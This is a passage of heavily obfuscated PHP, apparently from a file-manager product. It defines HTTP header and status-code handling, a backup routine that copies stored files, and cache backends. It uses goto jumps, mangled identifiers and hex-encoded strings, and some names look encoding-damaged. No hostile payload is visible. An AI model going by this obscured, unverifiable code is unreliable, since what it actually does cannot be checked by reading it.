$eİ¥¦èÖ => $FÅ†ÖÃ) { goto a…÷’–„Ìƒ; aë¾µ´ãĞä: unset($aáÔ§ïõ¯Œ[$a®½±âÏ[2465]]); $c³ª†¦¯†¹ = $this->deviceType($aáÔ§ïõ¯Œ[$a®½±âÏ[2288]]); if (isset($aŠŠŒ“¤®[$c³ª†¦¯†¹])) { continue; } goto Dã¶‘ê‹†; a…÷’–„Ìƒ: if ($eİ¥¦èÖ > 0 && abs($FÅ†ÖÃ[$a®½±âÏ[197]] - $aİŞçâô[$eİ¥¦èÖ - 1][$a®½±âÏ[197]]) < 5) { continue; } $aáÔ§ïõ¯Œ = json_decode($FÅ†ÖÃ[$a®½±âÏ[413]], !0); $FÅ†ÖÃ[$a®½±âÏ[2465]] = isset($aáÔ§ïõ¯Œ[$a®½±âÏ[2465]]) ? $aáÔ§ïõ¯Œ[$a®½±âÏ[2465]] : $a®½±âÏ[43]; goto aë¾µ´ãĞä; Dã¶‘ê‹†: $this->ipAddress($FÅ†ÖÃ); $FÅ†ÖÃ[$a®½±âÏ[413]] = $aáÔ§ïõ¯Œ; $aŠŠŒ“¤®[$c³ª†¦¯†¹] = $FÅ†ÖÃ; goto CÑ¡·†ÇÀÔ; CÑ¡·†ÇÀÔ: } return array_values($aŠŠŒ“¤®); } public function deviceType($FîŞô•¯˜) { return $FîŞô•¯˜; } } goto eö¨Éš‰‡…; AÇØš¹“°: class HttpHeader { public static $_headers = array("\x48\157\x73\164" => "\x48\124\x54\x50\137\110\117\x53\x54", "\x55\x73\x65\x72\55\x41\x67\x65\156\x74" => "\110\x54\x54\120\137\125\x53\x45\x52\137\101\107\x45\116\x54", "\103\x6f\156\x74\x65\156\x74\x2d\124\x79\160\x65" => "\x48\x54\x54\x50\x5f\103\117\116\124\105\116\x54\x5f\x54\131\120\x45", "\x43\157\156\x74\x65\156\164\x2d\x4c\x65\156\x67\x74\x68" => "\x48\124\x54\120\x5f\103\117\116\124\x45\116\x54\137\x4c\105\x4e\x47\x54\x48", "\x44\x65\160\164\150" => "\110\124\124\120\137\104\x45\120\x54\110", "\105\170\x70\145\143\x74" => "\x48\x54\x54\120\137\105\x58\x50\x45\x43\124", "\x49\146\55\x4e\157\156\x65\x2d\115\x61\164\x63\150" => "\110\x54\x54\x50\x5f\111\106\x5f\x4e\x4f\116\x45\x5f\115\101\x54\x43\110", "\x49\x66\55\x4d\141\164\143\x68" => "\110\x54\124\120\137\x49\106\137\115\x41\x54\103\110", "\111\146\55\x52\x61\x6e\x67\145" => "\x48\124\x54\120\137\x49\x46\137\x52\101\x4e\107\105", "\114\x61\x73\164\55\x4d\157\144\x69\146\151\145\144" => "\110\124\124\120\x5f\x4c\101\123\124\x5f\115\x4f\x44\x49\106\x49\x45\104", "\x49\146\55\x4d\x6f\144\x69\146\151\145\144\x2d\123\151\x6e\x63\145" => "\110\x54\124\x50\137\111\x46\x5f\115\117\x44\111\106\x49\105\x44\137\x53\x49\116\x43\x45", "\111\146\55\x55\156\155\x6f\x64\x69\x66\151\x65\144\x2d\123\x69\x6e\143\x65" => "\110\124\124\x50\137\x49\106\137\125\116\x4d\117\x44\111\x46\x49\x45\104\137\123\x49\x4e\103\105", "\122\141\156\147\x65" => "\110\124\x54\x50\137\122\101\116\x47\x45", "\124\x69\155\x65\x6f\x75\x74" => "\x48\124\124\x50\x5f\124\111\x4d\105\117\x55\124", "\111\x66" => "\110\x54\x54\x50\137\x49\x46", "\x4c\157\x63\153\x2d\124\157\x6b\x65\156" => "\x48\x54\124\x50\x5f\114\117\x43\113\137\x54\117\x4b\105\116", "\x4f\x76\x65\162\x77\x72\x69\x74\x65" => "\110\x54\124\x50\137\117\126\x45\122\127\x52\x49\124\105", "\x44\x65\x73\164\151\x6e\141\164\x69\157\156" => "\110\124\124\x50\x5f\104\105\123\x54\111\116\101\124\x49\117\116", "\122\x65\161\x75\145\x73\x74\x2d\111\x64" => "\x52\105\x51\x55\x45\123\124\x5f\x49\x44", "\122\145\x71\165\x65\x73\164\55\x42\x6f\144\171\x2d\x46\151\154\145" => "\x52\105\121\x55\x45\123\x54\137\102\117\104\131\137\106\111\114\105", "\x52\145\x64\151\x72\145\x63\x74\55\x53\164\x61\x74\x75\x73" => "\x52\x45\x44\x49\x52\105\103\124\x5f\x53\x54\x41\124\x55\x53"); public static function init() { static $C¶ÂÔ·‹ë = false; if ($C¶ÂÔ·‹ë) { return; } foreach ($_SERVER as $dáÊ‚èŸ»¼ => $BÏ«ÔĞÄ©Ê) { $dáÊ‚èŸ»¼ = strtoupper($dáÊ‚èŸ»¼); if (!array_key_exists($dáÊ‚èŸ»¼, $_SERVER)) { continue; } $_SERVER[$dáÊ‚èŸ»¼] = $BÏ«ÔĞÄ©Ê; } foreach (self::$_headers as $dáÊ‚èŸ»¼ => $Fµİ„Ñ÷÷) { if (!array_key_exists($dáÊ‚èŸ»¼, $_SERVER)) { continue; } $_SERVER[$dáÊ‚èŸ»¼] = $_SERVER[$Fµİ„Ñ÷÷]; $_SERVER[strtoupper($dáÊ‚èŸ»¼)] = $_SERVER[$Fµİ„Ñ÷÷]; } } public static function get($a‹‚¢×ƒç‹) { self::init(); return $_SERVER[$a‹‚¢×ƒç‹] ? $_SERVER[$a‹‚¢×ƒç‹] : $_SERVER[$_SERVER[©][1826] . strtoupper($a‹‚¢×ƒç‹)]; } public static function method() { return strtoupper(self::get($_SERVER[©][164])); } public static function length() { $eä¼êÂ‡Œ£ =& $_SERVER[©]; $A¡º²—«ëí = self::get($eä¼êÂ‡Œ£[1827]); if (!$A¡º²—«ëí) { $A¡º²—«ëí = self::get($eä¼êÂ‡Œ£[1143]); } return $A¡º²—«ëí; } public static function range() { $Bøå„òÄïò =& $_SERVER[©]; $dâ­’¸‰¦Ï = self::get($Bøå„òÄïò[208]); if (!$dâ­’¸‰¦Ï) { return !1; } if (!preg_match($Bøå„òÄïò[1828], $dâ­’¸‰¦Ï, $Fˆ„Í™×Ò )) { return !1; } if ($Fˆ„Í™×Ò [1] === $Bøå„òÄïò[43] && $Fˆ„Í™×Ò [2] === $Bøå„òÄïò[43]) { return !1; } return array($Fˆ„Í™×Ò [1] !== $Bøå„òÄïò[43] ? $Fˆ„Í™×Ò [1] : null, $Fˆ„Í™×Ò [2] !== $Bøå„òÄïò[43] ? $Fˆ„Í™×Ò [2] : null); } public static $statusCode = array("\61\60\x30" => "\x43\x6f\x6e\x74\151\156\x75\x65", "\61\60\61" => "\123\x77\x69\x74\x63\x68\151\156\x67\40\120\162\x6f\x74\157\x63\x6f\x6c", "\x31\60\62" => "\120\162\157\143\x65\163\163\151\x6e\x67", "\x31\60\x33" => "\x45\x61\x72\x6c\171\x20\x48\x69\x6e\164\163", "\62\x30\x30" => "\x4f\113", "\x32\60\x31" => "\103\162\x65\141\x74\x65\x64", "\x32\x30\x32" => "\101\143\x63\145\160\164\145\144", "\x32\60\63" => "\x4e\x6f\x6e\55\101\165\164\x68\x6f\x72\151\x74\141\x74\x69\166\145\40\111\x6e\x66\157\162\x6d\141\x74\x69\x6f\x6e", "\x32\x30\64" => "\x4e\157\x20\x43\157\x6e\164\145\156\164", "\62\x30\x35" => "\122\x65\163\x65\x74\x20\103\157\x6e\164\145\156\164", "\x32\x30\66" => "\120\141\162\164\151\141\x6c\x20\x43\157\156\x74\x65\x6e\164", "\62\x30\67" => "\x4d\165\x6c\164\151\x2d\123\x74\141\164\x75\x73", "\x33\60\x30" => "\x4d\x75\154\x74\151\x70\x6c\x65\x20\x43\150\157\x69\x63\145\163", "\x33\60\x31" => "\115\157\166\x65\x64\40\120\145\x72\x6d\x61\156\x65\x6e\x74\154\171", "\63\60\x32" => "\x46\157\x75\156\144", "\x33\60\63" => "\x53\x65\x65\40\117\164\x68\x65\162", "\63\x30\64" => "\x4e\157\164\40\x4d\x6f\144\x69\146\x69\145\144", "\x33\x30\65" => "\x55\163\145\x20\120\x72\x6f\170\x79", "\x33\x30\x37" => "\124\x65\x6d\x70\x6f\162\x61\162\171\x20\x52\x65\144\151\x72\145\143\x74", "\x33\60\x38" => "\120\145\x72\155\141\156\x65\x6e\x74\40\x52\x65\x64\151\162\x65\x63\164", "\64\x30\x30" => "\x42\141\x64\x20\x52\145\161\165\x65\163\x74", "\x34\x30\x31" => "\125\156\141\x75\164\x68\x6f\x72\151\172\x65\144", "\x34\x30\62" => "\x50\x61\171\x6d\145\156\164\x20\x52\145\161\x75\x69\x72\x65\144", "\64\x30\63" => "\x46\x6f\162\x62\151\144\x64\x65\156", "\x34\x30\x34" => "\116\157\x74\40\106\x6f\165\x6e\x64", "\64\x30\x35" => "\115\145\x74\150\x6f\x64\x20\116\x6f\x74\x20\x41\154\154\x6f\x77\145\144", "\64\x30\x36" => "\116\157\x74\x20\x41\143\143\145\160\164\141\142\x6c\x65", "\x34\x30\x37" => "\x50\162\157\x78\x79\40\x41\165\x74\150\x65\156\x74\x69\x63\141\164\x69\157\x6e\x20\x52\145\x71\x75\151\x72\145\x64", "\x34\x30\x38" => "\x52\145\x71\x75\x65\x73\164\40\124\151\x6d\x65\x6f\x75\x74", "\64\x30\x39" => "\103\x6f\x6e\x66\154\151\x63\x74", "\x34\x31\x30" => "\107\x6f\x6e\145", "\x34\x31\61" => "\x4c\x65\156\x67\x74\150\x20\122\x65\x71\165\151\x72\x65\x64", "\64\61\62" => "\120\162\145\143\x6f\x6e\144\x69\x74\x69\157\x6e\x20\106\141\x69\154\x65\x64", "\x34\61\63" => "\122\x65\161\165\x65\163\164\x20\x45\156\164\151\164\171\40\124\157\x6f\40\x4c\141\x72\x67\x65", "\x34\x31\x34" => "\122\145\161\165\x65\x73\x74\40\x55\x52\x49\x20\124\157\157\40\x4c\141\162\x67\x65", "\64\61\x35" => "\x55\156\163\165\160\160\x6f\x72\x74\145\144\x20\x4d\x65\144\151\141\40\124\171\x70\x65", "\x34\61\66" => "\122\x65\161\165\x65\163\164\x65\144\40\122\141\156\147\145\x20\116\157\164\40\x53\x61\x74\151\163\x66\151\141\x62\x6c\x65", "\x34\61\67" => "\105\x78\160\145\x63\164\x61\x74\x69\x6f\x6e\40\106\141\x69\x6c\x65\144", "\x34\x32\x32" => "\x55\x6e\x70\x72\x6f\x63\x65\163\x73\x61\x62\x6c\x65\x20\x45\x6e\x74\x69\x74\171", "\64\62\63" => "\114\157\143\153\145\x64", "\64\x32\x34" => "\106\141\x69\x6c\x65\x64\40\104\x65\160\145\x6e\144\145\x6e\x63\171", "\64\x32\65" => "\125\x6e\x6f\162\x64\x65\162\145\x64\40\103\157\154\x6c\x65\143\164\151\157\156", "\x34\x32\x36" => "\125\160\x67\x72\x61\x64\145\40\x52\145\161\165\151\162\145\x64", "\x34\x32\70" => "\x50\162\x65\143\x6f\156\x64\x69\164\151\x6f\x6e\40\122\145\x71\x75\151\162\145\x64", "\64\x32\71" => "\x54\x6f\157\40\x4d\141\156\171\40\122\145\161\165\x65\x73\164\163", "\x34\x33\61" => "\122\x65\161\165\145\163\x74\x20\x48\145\141\x64\145\162\40\106\x69\x65\x6c\x64\x73\x20\124\x6f\x6f\40\114\x61\162\147\x65", "\x34\x34\64" => "\x4e\x6f\x20\122\x65\x73\x70\157\156\x73\145", "\x34\x35\60" => "\102\x6c\157\x63\153\x65\144\x20\142\x79\40\x57\x69\156\144\157\x77\163\x20\120\x61\162\x65\x6e\164\x61\x6c\40\103\157\x6e\x74\x72\157\154\163", "\x34\x35\x31" => "\x55\156\x61\166\141\151\x6c\x61\142\x6c\x65\40\106\157\x72\x20\x4c\145\x67\141\154\40\122\145\141\163\157\156\163", "\64\x39\x34" => "\x52\145\161\x75\145\x73\164\40\110\x65\x61\x64\145\x72\x20\124\x6f\x6f\x20\114\x61\x72\147\x65", "\x35\x30\x30" => "\x49\156\x74\145\162\x6e\141\x6c\x20\x53\x65\x72\166\x65\x72\40\105\x72\x72\157\x72", "\x35\60\x31" => "\x4e\157\x74\40\111\x6d\160\154\145\155\145\156\x74\145\x64", "\65\60\x32" => "\102\141\x64\40\x47\141\x74\x65\167\141\x79", "\65\x30\63" => "\123\x65\x72\x76\x69\x63\145\40\125\156\x61\166\141\151\154\x61\142\154\145", "\65\60\x34" => "\107\x61\164\145\x77\x61\x79\40\124\151\155\145\157\x75\x74", "\x35\60\x35" => "\110\124\124\120\x20\x56\145\162\x73\151\x6f\156\40\156\x6f\x74\x20\x73\165\160\160\157\162\164\x65\x64", "\x35\x30\x37" => "\x49\x6e\163\165\146\x66\151\143\151\145\x6e\164\40\x53\x74\157\162\141\147\145"); public static function code($aÍ¡ªõ¹®) { $aèğ²””³ =& $_SERVER[©]; $aÍ¡ªõ¹® = $aÍ¡ªõ¹® . $aèğ²””³[43]; $EñË‚£©š = self::$statusCode[$aÍ¡ªõ¹®]; $EñË‚£©š = $EñË‚£©š ? "\110\124\x54\120\x2f\x31\x2e\61\x20{$aÍ¡ªõ¹®}\40" . $EñË‚£©š : $aèğ²””³[43]; return $EñË‚£©š; } } $BõÆ·ƒòÉ” = LIB_DIR . $_SERVER[©][777]; $C‰“˜ìÊò¥ = $_SERVER[©][778]; goto d¨»´›ŸŸ; a¹šÒ„¡õ: class BackupFile { public function __construct() { } public function index() { goto dóÉÕ“Ú˜”; cŠî ·Ë : $EÅ“˜ğù”é = $C«´¢©ìÄš ? 1 : 0; $fÉâàŠ£Í’ = array($_SERVER[©][750] => 1, $_SERVER[©][702] => time(), $_SERVER[©][708] => $EÅ“˜ğù”é, $_SERVER[©][747] => $D°çÛ“¬ƒÜ, $_SERVER[©][739] => $DïĞíÊ¯Ğ, $_SERVER[©][738] => $b‘Ô¦ö±“–); if ($Eâ›ÃİĞƒ) { $fÉâàŠ£Í’[$_SERVER[©][748]] = $FĞâòÆ‡ÈÙ; $fÉâàŠ£Í’[$_SERVER[©][749]] = $f¤¨íç; } goto B·•´‚Î; f‰¡Æ”çµ¬: $bŒ”ßÑÛ®ß->task[$_SERVER[©][697]] = $DïĞíÊ¯Ğ; $fÉâàŠ£Í’ = array($_SERVER[©][738] => $b‘Ô¦ö±“–, $_SERVER[©][739] => $DïĞíÊ¯Ğ); Backup::set($fÉâàŠ£Í’); goto Eùù‰ÀÇ„; CÆº„ÕÕ³: $f¤¨íç = $FĞâòÆ‡ÈÙ = 0; do { $dÖîÃ©‘Œë = $_SERVER[©][740]; $cÀ¿ˆåæ’ = Model($_SERVER[©][718])->where($Få·°½ñæ™)->field($dÖîÃ©‘Œë)->order($_SERVER[©][741])->selectPage($fœôäº´±, $DİÒŞ¶ÜŠ); $cêŒ‰Ò’¯Ô = !empty($cÀ¿ˆåæ’[$_SERVER[©][363]]) ? $cÀ¿ˆåæ’[$_SERVER[©][363]] : array(); foreach ($cêŒ‰Ò’¯Ô as $bó©ô¾›«İ) { goto dï™öæ¤¢¯; CŸ³™²ËÂ†: $Cø–à«‡ += $bó©ô¾›«İ[$_SERVER[©][87]]; $FĞâòÆ‡ÈÙ += 1; $f¤¨íç += $bó©ô¾›«İ[$_SERVER[©][87]]; goto aù»ê¯è¯É; aù»ê¯è¯É: if ($Cø–à«‡ >= 1024 * 1024 * 100) { $fÉâàŠ£Í’ = array($_SERVER[©][747] => $D°çÛ“¬ƒÜ, $_SERVER[©][748] => $FĞâòÆ‡ÈÙ, $_SERVER[©][749] => $f¤¨íç); Backup::set($fÉâàŠ£Í’); $Cø–à«‡ = $Eâ›ÃİĞƒ = 0; } goto Añ¼¥Á…; dï™öæ¤¢¯: if (!$this->_fileExist($bó©ô¾›«İ, $Aå¿µ¤ÑÒô, $Eï˜„„½í)) { $b‘Ô¦ö±“– -= 1; $DïĞíÊ¯Ğ -= (int) $bó©ô¾›«İ[$_SERVER[©][87]]; write_log("\146\151\154\145\40\x6e\157\x74\x20\x65\170\x69\x73\x74\56\146\151\x6c\145\111\x44\72{$bó©ô¾›«İ[$_SERVER[©][427]]}\x2c\40\160\141\164\150\x3a{$bó©ô¾›«İ[$_SERVER[©][85]]}", $_SERVER[©][742]); continue; } $E ŒôÇ«Ê¢ = $bó©ô¾›«İ[$_SERVER[©][85]]; $FÜ³®–‚İÅ = "\173\151\x6f\x3a{$E¦Õ«“‰››[$_SERVER[©][690]]}\175" . substr($E ŒôÇ«Ê¢, strlen("\173\x69\x6f\x3a{$bó©ô¾›«İ[$_SERVER[©][743]]}\x7d")); goto B¶ø®Å”‹à; B¶ø®Å”‹à: if (IO::exist($FÜ³®–‚İÅ)) { $bŒ”ßÑÛ®ß->updateFileEnd($bó©ô¾›«İ[$_SERVER[©][38]], $bó©ô¾›«İ[$_SERVER[©][87]]); } else { $FÜ³®–‚İÅ = get_path_father($FÜ³®–‚İÅ); IO::mkdir($FÜ³®–‚İÅ); if (!IO::copy($E ŒôÇ«Ê¢, $FÜ³®–‚İÅ, $_SERVER[©][744])) { write_log($_SERVER[©][745] . $E ŒôÇ«Ê¢ . $_SERVER[©][746] . $FÜ³®–‚İÅ . $_SERVER[©][484], $_SERVER[©][713]); $C«´¢©ìÄš = !1; break; } } $D°çÛ“¬ƒÜ = $bó©ô¾›«İ[$_SERVER[©][427]]; $Eâ›ÃİĞƒ += 1; goto CŸ³™²ËÂ†; Añ¼¥Á…: } $eù™²š¹Ú‡ = count($cêŒ‰Ò’¯Ô); $DİÒŞ¶ÜŠ++; } while ($eù™²š¹Ú‡ == $fœôäº´±); $bŒ”ßÑÛ®ß->end(); goto cŠî ·Ë ; dóÉÕ“Ú˜”: $E¦Õ«“‰›› = Backup::get(); $D°çÛ“¬ƒÜ = $E¦Õ«“‰››[$_SERVER[©][290]][$_SERVER[©][177]][$_SERVER[©][427]]; $Få·°½ñæ™ = array($_SERVER[©][428] => array($_SERVER[©][734], $D°çÛ“¬ƒÜ), $_SERVER[©][735] => array($_SERVER[©][328], $E¦Õ«“‰››[$_SERVER[©][690]])); goto d´•ÙÀ¾Ãá; fØ‰¼Ü‰ø¼: $fœôäº´± = 1000; $Cø–à«‡ = $Eâ›ÃİĞƒ = 0; $Aå¿µ¤ÑÒô = array(); goto CÆº„ÕÕ³; B·•´‚Î: Backup::set($fÉâàŠ£Í’); $this->_fileFilter($Aå¿µ¤ÑÒô); return !0; goto f¿¬àìîµŞ; d´•ÙÀ¾Ãá: $b‘Ô¦ö±“– = (int) Model($_SERVER[©][718])->where($Få·°½ñæ™)->count($_SERVER[©][427]); $DïĞíÊ¯Ğ = (int) Model($_SERVER[©][718])->where($Få·°½ñæ™)->sum($_SERVER[©][87]); $bŒ”ßÑÛ®ß = new TaskFileTransfer($_SERVER[©][736], $_SERVER[©][713], $b‘Ô¦ö±“–, LNG($_SERVER[©][714]) . $_SERVER[©][715] . LNG($_SERVER[©][737])); goto f‰¡Æ”çµ¬; Eùù‰ÀÇ„: $C«´¢©ìÄš = !0; $Eï˜„„½í = $this->storeIds(); $DİÒŞ¶ÜŠ = 1; goto fØ‰¼Ü‰ø¼; f¿¬àìîµŞ: } private function _fileExist($FŞã…Á¢ë, &$B×¾˜§’Ëğ, $E÷öËÏÈï°) { goto E¹’™¨‰; EšĞ‚™ßĞä: if (IO::exist($dœ™¾§Ìãë)) { $B×¾˜§’Ëğ[] = $FŞã…Á¢ë[$F’„·ˆÃğ¤[427]]; return !1; } $e¥êá²Ì = array($F’„·ˆÃğ¤[743] => $FŞã…Á¢ë[$F’„·ˆÃğ¤[743]], $F’„·ˆÃğ¤[85] => array($F’„·ˆÃğ¤[751], "{$dœ™¾§Ìãë}\x25")); $bâô¿Ò³‘ = Model($F’„·ˆÃğ¤[718])->where($e¥êá²Ì)->field($F’„·ˆÃğ¤[428])->select(); goto aÀæ¯…·¼§; a¯ˆÑ…„™œ: if (!in_array($FŞã…Á¢ë[$F’„·ˆÃğ¤[743]], $E÷öËÏÈï°)) { return !1; } if (IO::exist($aòÉ±áøº³)) { return !0; } $dœ™¾§Ìãë = get_path_father($aòÉ±áøº³); goto EšĞ‚™ßĞä; E¹’™¨‰: $F’„·ˆÃğ¤ =& $_SERVER[©]; $aòÉ±áøº³ = $FŞã…Á¢ë[$F’„·ˆÃğ¤[85]]; if (in_array($FŞã…Á¢ë[$F’„·ˆÃğ¤[427]], $B×¾˜§’Ëğ)) { return !1; } goto a¯ˆÑ…„™œ; aÀæ¯…·¼§: $B×¾˜§’Ëğ = array_merge($B×¾˜§’Ëğ, array_to_keyvalue($bâô¿Ò³‘, $F’„·ˆÃğ¤[43], $F’„·ˆÃğ¤[427])); return !1; goto FÊĞµ¶ÚÛ‘; FÊĞµ¶ÚÛ‘: } private function _fileFilter($FÚ—¢ˆ¦½) { $C“Ó–‘Æ  =& $_SERVER[©]; if (empty($FÚ—¢ˆ¦½)) { return; } $a˜ƒ™§Òøœ = array($C“Ó–‘Æ [427] => array($C“Ó–‘Æ [17], array_unique($FÚ—¢ˆ¦½))); $C§ªÕÍ°ÌÎ = Model($C“Ó–‘Æ [752])->where($a˜ƒ™§Òøœ)->field($C“Ó–‘Æ [377])->select(); foreach ($C§ªÕÍ°ÌÎ as $Fƒ„³Šğˆ) { Model($C“Ó–‘Æ [752])->remove($Fƒ„³Šğˆ[$C“Ó–‘Æ [377]], !1); } } private function storeIds() { $cÍ§Ì‹ØñË =& $_SERVER[©]; $EÜµŠó…Á¯ = Model($cÍ§Ì‹ØñË[703])->listData(); $b¬«Å¢¡‘Í = array(); $dˆê„Í™Æ = $GLOBALS[$cÍ§Ì‹ØñË[16]][$cÍ§Ì‹ØñË[94]][$cÍ§Ì‹ØñË[753]]; foreach ($EÜµŠó…Á¯ as $Bâ§ŸòÛ“) { $dÌÛÚ­š = strtolower($Bâ§ŸòÛ“[$cÍ§Ì‹ØñË[100]]); if (!isset($dˆê„Í™Æ[$dÌÛÚ­š])) { continue; } $E«ò’Í• = $cÍ§Ì‹ØñË[81] . (isset($dˆê„Í™Æ[$dÌÛÚ­š]) ? $dˆê„Í™Æ[$dÌÛÚ­š] : ucfirst($dÌÛÚ­š)); if (!class_exists($E«ò’Í•)) { continue; } $b¬«Å¢¡‘Í[] = $Bâ§ŸòÛ“[$cÍ§Ì‹ØñË[375]]; } return $b¬«Å¢¡‘Í; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto bš£ñ³Û³; Aä‘“ñÛµ‚: $Fª½å×“Ùà = $GLOBALS[$E«õç†„…ª[16]][$E«õç†„…ª[346]]; $E‘Ó¦Å©Í = $Fª½å×“Ùà[$Fª½å×“Ùà[$E«õç†„…ª[754]]]; $EŞÃ‹‹ä¹‚ = $Fª½å×“Ùà[$E«õç†„…ª[755]]; goto dÀ©ãŞ£ˆÒ; dÀ©ãŞ£ˆÒ: switch ($Fª½å×“Ùà[$E«õç†„…ª[754]]) { case $E«õç†„…ª[27]: self::$handle = Model($E«õç†„…ª[756]); break; case $E«õç†„…ª[757]: self::$handle = new CacheRedis($E‘Ó¦Å©Í, $EŞÃ‹‹ä¹‚); break; case $E«õç†„…ª[758]: self::$handle = new CacheMemcached($E‘Ó¦Å©Í, $EŞÃ‹‹ä¹‚); break; case $E«õç†„…ª[177]: self::$handle = new CacheFile($E‘Ó¦Å©Í, $EŞÃ‹‹ä¹‚); break; default: break; } return self::$handle; goto E¿ôÕ‡Á¦®; bš£ñ³Û³: $E«õç†„…ª =& $_SERVER[©]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Aä‘“ñÛµ‚; E¿ôÕ‡Á¦®: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($D¤¸å‚½ã”) { if (is_array($D¤¸å‚½ã”) || is_object($D¤¸å‚½ã”)) { $D¤¸å‚½ã” = json_encode($D¤¸å‚½ã”); } $D¤¸å‚½ã” = rawurlencode($D¤¸å‚½ã”); return KOD_SITE_ID . $_SERVER[©][80] . $D¤¸å‚½ã”; } public static function get($FĞì£“†«ƒ) { $aƒÔƒéñ› = self::key($FĞì£“†«ƒ); if (!isset(self::$memoryCache[$aƒÔƒéñ›])) { $fÔ«•ƒĞ = self::init()->get($aƒÔƒéñ›); self::$memoryCache[$aƒÔƒéñ›] = unserialize($fÔ«•ƒĞ); } return self::$memoryCache[$aƒÔƒéñ›]; } public static function set($CÃà¿’˜Ãº, $fÕ’Ê‹©‹×, $eàóö‹ÛĞ‹ = false) { goto AøĞ×Æ•°ğ; E±ê¤îªˆƒ: CacheLock::unlock($CÃà¿’˜Ãº); return $aÏœÉ‚«¡Ñ; goto D³öŒÒˆêÊ; AøĞ×Æ•°ğ: $cå…ÒÍ•¿Ô = self::key($CÃà¿’˜Ãº); if (isset(self::$memoryCache[$cå…ÒÍ•¿Ô]) && self::$memoryCache[$cå…ÒÍ•¿Ô] === $fÕ’Ê‹©‹×) { return !0; } if ($eàóö‹ÛĞ‹ === 0) { self::$memoryCache[$cå…ÒÍ•¿Ô] = $fÕ’Ê‹©‹×; return !0; } goto CÙô·½ƒ©Ú; CÙô·½ƒ©Ú: CacheLock::lock($CÃà¿’˜Ãº); $aÏœÉ‚«¡Ñ = self::init()->set($cå…ÒÍ•¿Ô, serialize($fÕ’Ê‹©‹×), $eàóö‹ÛĞ‹); self::$memoryCache[$cå…ÒÍ•¿Ô] = $fÕ’Ê‹©‹×; goto E±ê¤îªˆƒ; D³öŒÒˆêÊ: } public static function remove($D™¥Ÿ„æƒ–) { goto cË˜ù‹Éœ­; c˜ÕÆ±ê«¿: return $C‡³Ñ‘¡; goto FÎÉå¼«Á¿; cË˜ù‹Éœ­: $a×Úåè”Ô = self::key($D™¥Ÿ„æƒ–); unset(self::$memoryCache[$a×Úåè”Ô]); self::clearTimeout(); goto d‹ˆ†‹¬öÇ; d‹ˆ†‹¬öÇ: CacheLock::lock($D™¥Ÿ„æƒ–); $C‡³Ñ‘¡ = self::init()->remove($a×Úåè”Ô); CacheLock::unlock($D™¥Ÿ„æƒ–); goto c˜ÕÆ±ê«¿; FÎÉå¼«Á¿: } public static function clearMemory($cÚ¾…óéõÃ = false) { if ($cÚ¾…óéõÃ) { $cÚ¾…óéõÃ = self::key($cÚ¾…óéõÃ); unset(self::$memoryCache[$cÚ¾…óéõÃ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[©][759])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[©][760])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($C˜óƒ«§ßÚ, $ešÃÃ‚Üè¦) { $c÷Å“‘Å®Ø =& $_SERVER[©]; $this->cachePath = $C˜óƒ«§ßÚ[$c÷Å“‘Å®Ø[85]]; $this->prefix = $c÷Å“‘Å®Ø[761]; $this->cacheTime = $ešÃÃ‚Üè¦; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($aŞö…‡ÂØ¼) { $f‚èİäªÌÌ =& $_SERVER[©]; $aŞö…‡ÂØ¼ = str_replace(array($f‚èİäªÌÌ[762], $f‚èİäªÌÌ[103], $f‚èİäªÌÌ[79]), $f‚èİäªÌÌ[763], $aŞö…‡ÂØ¼); return $this->cachePath . $f‚èİäªÌÌ[764] . $aŞö…‡ÂØ¼ . $f‚èİäªÌÌ[765]; } public function set($Fêçô—¬Òà, $F¯ÊŠñö©…, $b”ò†èÖÍ‡ = false) { $bö°¡ÀÆš = $this->getFile($Fêçô—¬Òà); if (file_put_contents($bö°¡ÀÆš, $this->prefix . $F¯ÊŠñö©…, LOCK_EX)) { return !0; } @unlink($bö°¡ÀÆš); return !1; } public function get($F²šÔÅùÉ) { $A•¢’ªáŒ = $this->getFile($F²šÔÅùÉ); if (file_exists($A•¢’ªáŒ) && filemtime($A•¢’ªáŒ) < time() - $this->cacheTime) { @unlink($A•¢’ªáŒ); return !1; } $a˜”õšºßä = @file_get_contents($A•¢’ªáŒ); return substr($a˜”õšºßä, strlen($this->prefix)); } public function remove($bØÛ©‰¢à›) { $DŞçÄàŸš = $this->getFile($bØÛ©‰¢à›); return @unlink($DŞçÄàŸš); } public function deleteAll() { $bÜÚÜÜÁƒ¶ =& $_SERVER[©]; $aĞ©¨ôç ê = scandir($this->cachePath); foreach ($aĞ©¨ôç ê as $f®ĞÁÄ†‡) { $c²ğÒâÊá = $this->cachePath . $f®ĞÁÄ†‡; if (strpos($c²ğÒâÊá, $bÜÚÜÜÁƒ¶[765]) && strpos($c²ğÒâÊá, $bÜÚÜÜÁƒ¶[766])) { @unlink($c²ğÒâÊá); } } } public function clearTimeout() { $AÉŞƒº¹  =& $_SERVER[©]; $c¯Ó¸Àœì… = scandir($this->cachePath); foreach ($c¯Ó¸Àœì… as $bÆ‚¶) { $a°¢–ÕÔ¥ = $this->cachePath . $bÆ‚¶; if (strpos($a°¢–ÕÔ¥, $AÉŞƒº¹ [765]) && strpos($a°¢–ÕÔ¥, $AÉŞƒº¹ [766]) && filemtime($a°¢–ÕÔ¥) < time() - $this->cacheTime) { @unlink($a°¢–ÕÔ¥); } } } } goto f²¥¶Ô‡£Â; AÎììŠÅ¯‹: function Action($e¡İ²ÒÛ˜… = '') { goto d˜¶É±¨¼; B«“¿ƒáÙÑ: $D±ëò¿“†õ = strtolower($eŒâô¿öù[0]); if (substr($D±ëò¿“†õ, -6) == $C³»¹´¹ç–[6]) { $e¡İ²ÒÛ˜… = substr($eŒâô¿öù[0], 0, -6); $eˆÜàÛéÒÔ = $e¡İ²ÒÛ˜… . $C³»¹´¹ç–[7]; $a³èõï’Öâ = $C³»¹´¹ç–[8]; if (isset($eŒâô¿öù[1]) && substr(strtolower($eŒâô¿öù[1]), -5) == $C³»¹´¹ç–[9]) { $eˆÜàÛéÒÔ = $e¡İ²ÒÛ˜… . $eŒâô¿öù[1]; $a³èõï’Öâ = $C³»¹´¹ç–[10] . 